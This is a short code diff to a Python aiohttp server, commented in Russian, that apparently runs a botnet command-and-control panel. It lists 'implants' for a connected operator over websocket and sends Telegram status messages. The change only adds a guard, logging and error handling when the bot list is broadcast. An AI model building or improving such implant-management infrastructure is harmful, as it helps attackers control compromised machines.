@@ -81,9 +81,21 @@ async def websocket_handler(request):
     return ws
 
 async def broadcast_bot_list():
-    if OPERATOR and not OPERATOR.closed:
-        bot_ids = list(IMPLANTS.keys())
-        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
+  """
+  Рассылает обновленный список ботов ТОЛЬКО ЕСЛИ оператор на месте.
+  """
+  # <<< ГЛАВНОЕ ИЗМЕНЕНИЕ: ПРОВЕРЯЕМ, ЖИВ ЛИ ОПЕРАТОР
+  if OPERATOR and not OPERATOR.closed:
+    bot_ids = list(IMPLANTS.keys())
+    print(f"[*] Обновление списка ботов для оператора: {bot_ids}")
+    try:
+      # Отправляем, только если уверены, что он слушает
+      await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
+    except ConnectionResetError:
+      # На случай, если он отключился ровно в эту миллисекунду
+      print("[!] Оператор отключился во время отправки списка ботов.")
+  else:
+    print("[*] Список ботов изменился, но оператор не в сети. Отправка отменена.")
 
 async def http_handler(request):
     return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))
@@ -107,5 +119,6 @@ if __name__ == "__main__":
         print("\nСервер остановлен вручную.")
     finally:
         send_telegram_message("🛑 Сервер 'Крепость' V2.0 остановлен.")
+
 
 
